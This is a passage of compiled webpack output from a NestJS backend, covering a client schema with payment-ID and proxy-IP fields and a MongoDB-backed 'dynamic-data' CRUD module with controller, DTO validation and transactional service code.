    (0, swagger_1.ApiProperty)({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' }),
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], Client.prototype, "gpayId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ example: ['192.168.1.100:8080', '192.168.1.101:8080'], description: 'Dedicated proxy IPs assigned to this client' }),
    (0, mongoose_1.Prop)({ required: false, type: [String], default: [] }),
    __metadata("design:type", Array)
], Client.prototype, "dedicatedIps", void 0);
exports.Client = Client = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], Client);
exports.ClientSchema = mongoose_1.SchemaFactory.createForClass(Client);


/***/ }),

/***/ "./src/components/clients/schemas/index.ts":
/*!*************************************************!*\
  !*** ./src/components/clients/schemas/index.ts ***!
  \*************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./client.schema */ "./src/components/clients/schemas/client.schema.ts"), exports);


/***/ }),

/***/ "./src/components/dynamic-data/dto/create-dynamic-data.dto.ts":
/*!********************************************************************!*\
  !*** ./src/components/dynamic-data/dto/create-dynamic-data.dto.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateDynamicDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateDynamicDataDto {
}
exports.CreateDynamicDataDto = CreateDynamicDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Unique identifier for the dynamic data',
        example: 'user123',
    }),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", String)
], CreateDynamicDataDto.prototype, "configKey", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Dynamic JSON data',
        example: {
            profile: {
                name: 'John Doe',
                age: 30,
            },
            preferences: {
                theme: 'dark',
                notifications: true,
            },
        },
    }),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Object)
], CreateDynamicDataDto.prototype, "data", void 0);


/***/ }),

/***/ "./src/components/dynamic-data/dto/get-dynamic-data.dto.ts":
/*!*****************************************************************!*\
  !*** ./src/components/dynamic-data/dto/get-dynamic-data.dto.ts ***!
  \*****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.GetDynamicDataDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class GetDynamicDataDto {
}
exports.GetDynamicDataDto = GetDynamicDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Path to retrieve specific data using dot notation',
        example: 'profile.name',
        required: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-zA-Z0-9]+([\._][a-zA-Z0-9]+)*$/, {
        message: 'Invalid path format. Use dot notation (e.g., profile.name)',
    }),
    __metadata("design:type", String)
], GetDynamicDataDto.prototype, "path", void 0);


/***/ }),

/***/ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts":
/*!********************************************************************!*\
  !*** ./src/components/dynamic-data/dto/update-dynamic-data.dto.ts ***!
  \********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateDynamicDataDto = exports.ArrayOperation = exports.ArrayOperationType = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
var ArrayOperationType;
(function (ArrayOperationType) {
    ArrayOperationType["PUSH"] = "PUSH";
    ArrayOperationType["POP"] = "POP";
    ArrayOperationType["INSERT"] = "INSERT";
    ArrayOperationType["REMOVE"] = "REMOVE";
    ArrayOperationType["UPDATE"] = "UPDATE";
})(ArrayOperationType || (exports.ArrayOperationType = ArrayOperationType = {}));
class ArrayOperation {
}
exports.ArrayOperation = ArrayOperation;
__decorate([
    (0, swagger_1.ApiProperty)({
        enum: ArrayOperationType,
        description: 'Type of array operation to perform',
    }),
    (0, class_validator_1.IsEnum)(ArrayOperationType),
    __metadata("design:type", String)
], ArrayOperation.prototype, "type", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Index for array operations (required for INSERT and UPDATE)',
        required: false,
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", Number)
], ArrayOperation.prototype, "index", void 0);
class UpdateDynamicDataDto {
}
exports.UpdateDynamicDataDto = UpdateDynamicDataDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Path to the field to update using dot notation. If not provided, updates entire data object.',
        example: 'profile.age',
        required: false,
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    (0, class_validator_1.Matches)(/^[a-zA-Z0-9]+([\._][a-zA-Z0-9]+)*$/, {
        message: 'Invalid path format. Use dot notation (e.g., profile.age)',
    }),
    __metadata("design:type", String)
], UpdateDynamicDataDto.prototype, "path", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'New value for the field or entire data object if path is not provided',
        example: { profile: { age: 31 } },
    }),
    (0, class_validator_1.IsNotEmpty)(),
    __metadata("design:type", Object)
], UpdateDynamicDataDto.prototype, "value", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Array operation configuration',
        required: false,
        type: ArrayOperation,
    }),
    (0, class_validator_1.IsOptional)(),
    __metadata("design:type", ArrayOperation)
], UpdateDynamicDataDto.prototype, "arrayOperation", void 0);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.controller.ts":
/*!****************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.controller.ts ***!
  \****************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const dynamic_data_service_1 = __webpack_require__(/*! ./dynamic-data.service */ "./src/components/dynamic-data/dynamic-data.service.ts");
const create_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/create-dynamic-data.dto */ "./src/components/dynamic-data/dto/create-dynamic-data.dto.ts");
const update_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/update-dynamic-data.dto */ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts");
const get_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/get-dynamic-data.dto */ "./src/components/dynamic-data/dto/get-dynamic-data.dto.ts");
let DynamicDataController = class DynamicDataController {
    constructor(dynamicDataService) {
        this.dynamicDataService = dynamicDataService;
    }
    async create(createDynamicDataDto) {
        return this.dynamicDataService.create(createDynamicDataDto);
    }
    async findAll() {
        return this.dynamicDataService.findAll();
    }
    async checkNpoint() {
        await this.dynamicDataService.checkNpoint();
        return { message: 'Npoint check completed' };
    }
    async findOne(configKey, { path }) {
        return this.dynamicDataService.findOne(configKey, path);
    }
    async update(configKey, updateDynamicDataDto) {
        return this.dynamicDataService.update(configKey, updateDynamicDataDto);
    }
    async remove(configKey, { path }) {
        await this.dynamicDataService.remove(configKey, path);
    }
};
exports.DynamicDataController = DynamicDataController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new dynamic data document' }),
    (0, swagger_1.ApiResponse)({
        status: 201,
        description: 'The dynamic data document has been successfully created.',
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request' }),
    (0, swagger_1.ApiResponse)({ status: 409, description: 'Conflict - Document already exists' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_dynamic_data_dto_1.CreateDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get all dynamic data documents' }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Returns all dynamic data documents as a key-value object',
    }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "findAll", null);
__decorate([
    (0, common_1.Post)('check-npoint'),
    (0, common_1.HttpCode)(common_1.HttpStatus.OK),
    (0, swagger_1.ApiOperation)({ summary: 'Check and update npoint data if needed' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Npoint data check completed successfully' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "checkNpoint", null);
__decorate([
    (0, common_1.Get)(':configKey'),
    (0, swagger_1.ApiOperation)({ summary: 'Get dynamic data by configKey' }),
    (0, swagger_1.ApiParam)({ name: 'configKey', description: 'Unique identifier for the document' }),
    (0, swagger_1.ApiQuery)({
        name: 'path',
        required: false,
        description: 'Optional path to retrieve specific nested data',
    }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'Returns the requested dynamic data' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document or path not found' }),
    __param(0, (0, common_1.Param)('configKey')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, get_dynamic_data_dto_1.GetDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(':configKey'),
    (0, swagger_1.ApiOperation)({ summary: 'Update dynamic data by configKey' }),
    (0, swagger_1.ApiParam)({ name: 'configKey', description: 'Unique identifier for the document' }),
    (0, swagger_1.ApiResponse)({ status: 200, description: 'The dynamic data has been successfully updated' }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document not found' }),
    __param(0, (0, common_1.Param)('configKey')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_dynamic_data_dto_1.UpdateDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':configKey'),
    (0, common_1.HttpCode)(common_1.HttpStatus.NO_CONTENT),
    (0, swagger_1.ApiOperation)({ summary: 'Delete dynamic data by configKey' }),
    (0, swagger_1.ApiParam)({ name: 'configKey', description: 'Unique identifier for the document' }),
    (0, swagger_1.ApiQuery)({
        name: 'path',
        required: false,
        description: 'Optional path to delete specific nested data',
    }),
    (0, swagger_1.ApiResponse)({ status: 204, description: 'The dynamic data has been successfully deleted' }),
    (0, swagger_1.ApiResponse)({ status: 404, description: 'Document or path not found' }),
    __param(0, (0, common_1.Param)('configKey')),
    __param(1, (0, common_1.Query)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, get_dynamic_data_dto_1.GetDynamicDataDto]),
    __metadata("design:returntype", Promise)
], DynamicDataController.prototype, "remove", null);
exports.DynamicDataController = DynamicDataController = __decorate([
    (0, swagger_1.ApiTags)('dynamic-data'),
    (0, common_1.Controller)('dynamic-data'),
    __metadata("design:paramtypes", [dynamic_data_service_1.DynamicDataService])
], DynamicDataController);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.module.ts":
/*!************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.module.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const dynamic_data_controller_1 = __webpack_require__(/*! ./dynamic-data.controller */ "./src/components/dynamic-data/dynamic-data.controller.ts");
const dynamic_data_service_1 = __webpack_require__(/*! ./dynamic-data.service */ "./src/components/dynamic-data/dynamic-data.service.ts");
const dynamic_data_schema_1 = __webpack_require__(/*! ./dynamic-data.schema */ "./src/components/dynamic-data/dynamic-data.schema.ts");
const n_point_1 = __webpack_require__(/*! ../n-point */ "./src/components/n-point/index.ts");
let DynamicDataModule = class DynamicDataModule {
};
exports.DynamicDataModule = DynamicDataModule;
exports.DynamicDataModule = DynamicDataModule = __decorate([
    (0, common_1.Module)({
        imports: [
            mongoose_1.MongooseModule.forFeature([
                { name: dynamic_data_schema_1.DynamicData.name, schema: dynamic_data_schema_1.DynamicDataSchema },
            ]),
            n_point_1.NpointModule,
        ],
        controllers: [dynamic_data_controller_1.DynamicDataController],
        providers: [dynamic_data_service_1.DynamicDataService],
        exports: [dynamic_data_service_1.DynamicDataService],
    })
], DynamicDataModule);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.schema.ts":
/*!************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.schema.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataSchema = exports.DynamicData = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
let DynamicData = class DynamicData {
};
exports.DynamicData = DynamicData;
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true, type: String }),
    __metadata("design:type", String)
], DynamicData.prototype, "configKey", void 0);
__decorate([
    (0, mongoose_1.Prop)({ type: mongoose_2.Schema.Types.Mixed, required: true }),
    __metadata("design:type", Object)
], DynamicData.prototype, "data", void 0);
exports.DynamicData = DynamicData = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'dynamic_data',
        versionKey: false,
        timestamps: true,
        strict: false,
        toJSON: {
            transform: (_, ret) => {
                delete ret._id;
                return ret;
            },
        },
    })
], DynamicData);
exports.DynamicDataSchema = mongoose_1.SchemaFactory.createForClass(DynamicData);


/***/ }),

/***/ "./src/components/dynamic-data/dynamic-data.service.ts":
/*!*************************************************************!*\
  !*** ./src/components/dynamic-data/dynamic-data.service.ts ***!
  \*************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var DynamicDataService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.DynamicDataService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const dynamic_data_schema_1 = __webpack_require__(/*! ./dynamic-data.schema */ "./src/components/dynamic-data/dynamic-data.schema.ts");
const update_dynamic_data_dto_1 = __webpack_require__(/*! ./dto/update-dynamic-data.dto */ "./src/components/dynamic-data/dto/update-dynamic-data.dto.ts");
const lodash_1 = __webpack_require__(/*! lodash */ "lodash");
const mongoose_3 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose = __importStar(__webpack_require__(/*! mongoose */ "mongoose"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let DynamicDataService = DynamicDataService_1 = class DynamicDataService {
    constructor(dynamicDataModel, connection, npointService) {
        this.dynamicDataModel = dynamicDataModel;
        this.connection = connection;
        this.npointService = npointService;
        this.logger = new utils_1.Logger(DynamicDataService_1.name);
    }
    async create(createDto) {
        this.logger.debug(`Creating dynamic data with configKey: ${createDto.configKey}`);
        const session = await this.connection.startSession();
        try {
            await session.startTransaction();
            this.logger.debug('Started transaction for create operation');
            const exists = await this.dynamicDataModel.findOne({ configKey: createDto.configKey }).session(session);
            if (exists) {
                this.logger.warn(`Attempted to create duplicate configKey: ${createDto.configKey}`);
                throw new common_1.ConflictException(`Document with configKey ${createDto.configKey} already exists`);
            }
            const created = new this.dynamicDataModel(createDto);
            await created.save({ session });
            this.logger.debug(`Successfully created dynamic data for configKey: ${createDto.configKey}`);
            await session.commitTransaction();
            this.logger.debug('Transaction committed successfully');
            return created.toJSON().data;
        }
        catch (error) {
            await session.abortTransaction();
            (0, utils_1.parseError)(error, 'Failed to create dynamic data: ', true);
            this.logger.error(`Failed to create dynamic data: ${error.message}`, error.stack);
            if (error instanceof common_1.ConflictException) {
                throw error;
            }
            throw new common_1.BadRequestException('Failed to create dynamic data');
        }
        finally {
            await session.endSession();
        }
    }
    async findOne(configKey, path) {
        this.logger.debug(`Finding dynamic data with configKey: ${configKey}${path ? `, path: ${path}` : ''}`);
        const doc = await this.dynamicDataModel.findOne({ configKey });
        if (!doc) {
            this.logger.warn(`Document not found with configKey: ${configKey}`);
            throw new common_1.NotFoundException(`Document with configKey ${configKey} not found`);
        }
        if (path) {
            if (!(0, lodash_1.has)(doc.data, path)) {
                this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);
                throw new common_1.NotFoundException(`Path ${path} not found in document`);
            }
            this.logger.debug(`Successfully retrieved data at path: ${path}`);
            return (0, lodash_1.get)(doc.data, path);
        }
        this.logger.debug(`Successfully retrieved full document for configKey: ${configKey}`);
        return doc.toJSON().data;
    }
    async update(configKey, updateDto, session) {
        this.logger.debug(`Updating dynamic data for configKey: ${configKey}`);
        const useSession = session || await this.connection.startSession();
        let shouldEndSession = false;
        try {
            if (!session) {
                shouldEndSession = true;
                await useSession.startTransaction();
                this.logger.debug('Started new transaction for update operation');
            }
            const doc = await this.dynamicDataModel.findOne({ configKey }).session(useSession);
            if (!doc) {
                this.logger.warn(`Document not found with configKey: ${configKey}`);
                throw new common_1.NotFoundException(`Document with configKey ${configKey} not found`);
            }
            if (updateDto.arrayOperation) {
                if (!updateDto.path) {
                    this.logger.error('Attempted array operation without specifying path');
                    throw new common_1.BadRequestException('Path is required for array operations');
                }
                this.logger.debug(`Performing array operation: ${updateDto.arrayOperation.type} on path: ${updateDto.path}`);
                await this.handleArrayOperation(doc, updateDto, useSession);
            }
            else if (updateDto.path) {
                if (!(0, lodash_1.has)(doc.data, updateDto.path)) {
                    this.logger.warn(`Path ${updateDto.path} not found in document with configKey: ${configKey}`);
                    throw new common_1.NotFoundException(`Path ${updateDto.path} not found in document`);
                }
                this.logger.debug(`Updating value at path: ${updateDto.path}`);
                (0, lodash_1.set)(doc.data, updateDto.path, updateDto.value);
            }
            else {
                this.logger.debug('Performing full data update');
                doc.data = updateDto.value;
            }
            await doc.save({ session: useSession });
            this.logger.debug(`Successfully updated document with configKey: ${configKey}`);
            if (shouldEndSession) {
                await useSession.commitTransaction();
                this.logger.debug('Transaction committed successfully');
            }
            return doc.toJSON();
        }
        catch (error) {
            if (shouldEndSession) {
                await useSession.abortTransaction();
                this.logger.error('Transaction aborted due to error');
            }
            (0, utils_1.parseError)(error, 'Failed to update dynamic data: ', true);
            this.logger.error(`Failed to update dynamic data: ${error.message}`, error.stack);
            throw error;
        }
        finally {
            if (shouldEndSession) {
                await useSession.endSession();
            }
        }
    }
    async handleArrayOperation(doc, updateDto, session) {
        this.logger.debug(`Handling array operation: ${updateDto.arrayOperation.type} at path: ${updateDto.path}`);
        const array = (0, lodash_1.get)(doc.data, updateDto.path);
        if (!Array.isArray(array)) {
            this.logger.error(`Path ${updateDto.path} is not an array`);
            throw new common_1.BadRequestException(`Path ${updateDto.path} is not an array`);
        }
        const { type, index } = updateDto.arrayOperation;
        try {
            switch (type) {
                case update_dynamic_data_dto_1.ArrayOperationType.PUSH:
                    this.logger.debug(`Pushing new value to array at path: ${updateDto.path}`);
                    array.push(updateDto.value);
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.POP:
                    this.logger.debug(`Popping value from array at path: ${updateDto.path}`);
                    array.pop();
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.INSERT:
                    if (index === undefined || index < 0 || index > array.length) {
                        this.logger.error(`Invalid index ${index} for INSERT operation`);
                        throw new common_1.BadRequestException('Invalid array index for INSERT operation');
                    }
                    this.logger.debug(`Inserting value at index ${index} in array at path: ${updateDto.path}`);
                    array.splice(index, 0, updateDto.value);
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.REMOVE:
                    if (index === undefined || index < 0 || index >= array.length) {
                        this.logger.error(`Invalid index ${index} for REMOVE operation`);
                        throw new common_1.BadRequestException('Invalid array index for REMOVE operation');
                    }
                    this.logger.debug(`Removing value at index ${index} from array at path: ${updateDto.path}`);
                    array.splice(index, 1);
                    break;
                case update_dynamic_data_dto_1.ArrayOperationType.UPDATE:
                    if (index === undefined || index < 0 || index >= array.length) {
                        this.logger.error(`Invalid index ${index} for UPDATE operation`);
                        throw new common_1.BadRequestException('Invalid array index for UPDATE operation');
                    }
                    this.logger.debug(`Updating value at index ${index} in array at path: ${updateDto.path}`);
                    array[index] = updateDto.value;
                    break;
                default:
                    this.logger.error(`Invalid array operation type: ${type}`);
                    throw new common_1.BadRequestException('Invalid array operation type');
            }
            (0, lodash_1.set)(doc.data, updateDto.path, array);
            await doc.save({ session });
            this.logger.debug('Array operation completed successfully');
        }
        catch (error) {
            this.logger.error(`Array operation failed: ${error.message}`, error.stack);
            throw error;
        }
    }
    async remove(configKey, path) {
        this.logger.debug(`Removing dynamic data for configKey: ${configKey}${path ? `, path: ${path}` : ''}`);
        const session = await this.connection.startSession();
        try {
            await session.startTransaction();
            this.logger.debug('Started transaction for remove operation');
            const doc = await this.dynamicDataModel.findOne({ configKey }).session(session);
            if (!doc) {
                this.logger.warn(`Document not found with configKey: ${configKey}`);
                throw new common_1.NotFoundException(`Document with configKey ${configKey} not found`);
            }
            if (path) {
                if (!(0, lodash_1.has)(doc.data, path)) {
                    this.logger.warn(`Path ${path} not found in document with configKey: ${configKey}`);
                    throw new common_1.NotFoundException(`Path ${path} not found in document`);
                }
                this.logger.debug(`Removing data at path: ${path}`);
                (0, lodash_1.unset)(doc.data, path);
                await doc.save({ session });
            }
            else {
                this.logger.debug(`Deleting entire document with configKey: ${configKey}`);
                await this.dynamicDataModel.deleteOne({ configKey }).session(session);
            }
            await session.commitTransaction();
            this.logger.debug('Transaction committed successfully');
        }
        catch (error) {
            await session.abortTransaction();
            (0, utils_1.parseError)(error, 'Failed to remove dynamic data: ', true);
            this.logger.error(`Failed to remove dynamic data: ${error.message}`, error.stack);
            throw error;
        }
        finally {
            await session.endSession();
        }
    }
    async findAll() {
        this.logger.debug('Retrieving all dynamic data documents');
        try {
            const documents = await this.dynamicDataModel.find().exec();
            const result = documents.reduce((acc, doc) => {
                acc[doc.configKey] = doc.toJSON().data;
                return acc;
            }, {});
            this.logger.debug(`Successfully retrieved ${documents.length} dynamic data documents`);
            return result;
        }
        catch (error) {
            (0, utils_1.parseError)(error, 'Failed to retrieve all dynamic data: ', true);
            this.logger.error(`Failed to retrieve all dynamic data: ${error.message}`, error.stack);
            throw error;
        }
    }
    async checkNpoint() {
    }
};
exports.DynamicDataService = DynamicDataService;
exports.DynamicDataService = DynamicDataService = DynamicDataService_1 = __decorate([
    (0, common_1.Injectable)(),
